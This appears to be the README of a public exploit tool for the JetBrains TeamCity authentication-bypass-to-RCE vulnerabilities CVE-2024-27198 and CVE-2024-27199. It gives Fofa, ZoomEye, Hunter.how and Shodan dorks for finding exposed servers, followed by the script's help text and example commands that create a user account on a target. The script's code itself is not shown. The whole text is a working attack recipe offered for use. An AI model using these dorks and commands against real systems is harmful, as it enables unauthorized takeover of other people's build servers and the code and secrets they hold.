# Cyberspace Mapping Dork

## Fofa

```
app="JET_BRAINS-TeamCity"
```

## ZoomEye

```
app:"JetBrains TeamCity"
```

## Hunter.how

```
product.name="TeamCity"
```

## Shodan

```
http.component:"teamcity"
```

# How to use

I'm using `Python3.9`.

```shell
pip install requests urllib3
```

```shell
python CVE-2024-27198-RCE.py -h

 _____                     ____ _ _           ____   ____ _____
|_   _|__  __ _ _ __ ___  / ___(_) |_ _   _  |  _ \ / ___| ____|
  | |/ _ \/ _` | '_ ` _ \| |   | | __| | | | | |_) | |   |  _|
  | |  __/ (_| | | | | | | |___| | |_| |_| | |  _ <| |___| |___
  |_|\___|\__,_|_| |_| |_|\____|_|\__|\__, | |_| \_\\____|_____|
                                      |___/
                                                                            Author: @W01fh4cker
                                                                            Github: https://github.com/W01fh4cker

usage: CVE-2024-27198-RCE.py [-h] [-u USERNAME] [-p PASSWORD] -t TARGET [-d DOMAIN] [--proxy PROXY]

CVE-2024-27198 & CVE-2024-27199 Authentication Bypass --> RCE in JetBrains TeamCity Pre-2023.11.4

options:
  -h, --help            show this help message and exit
  -u USERNAME, --username USERNAME
                        username you want to add. If left blank, it will be randomly generated.
  -p PASSWORD, --password PASSWORD
                        password you want to add. If left blank, it will be randomly generated.
  -t TARGET, --target TARGET
                        target url
  -d DOMAIN, --domain DOMAIN
                        The domain name of the email address
  --proxy PROXY         eg: http://127.0.0.1:8080
```

For example:

```shell
python CVE-2024-27198-RCE.py -t http://dev.w01fh4cker.local
```

![](https://raw.githubusercontent.com/W01fh4cker/blog_image/main/image-20240306115808070.png)

other:

```
python CVE-2024-27198-RCE.py -t http://dev.w01fh4cker.local -u test -p test@123 -d poc.com --proxy http://127.0.0.1:8080
```

# Reference

https://www.rapid7.com/blog/post/2024/03/04/etr-cve-2024-27198-and-cve-2024-27199-jetbrains-teamcity-multiple-authentication-bypass-vulnerabilities-fixed/

https://github.com/Chocapikk/CVE-2024-27198
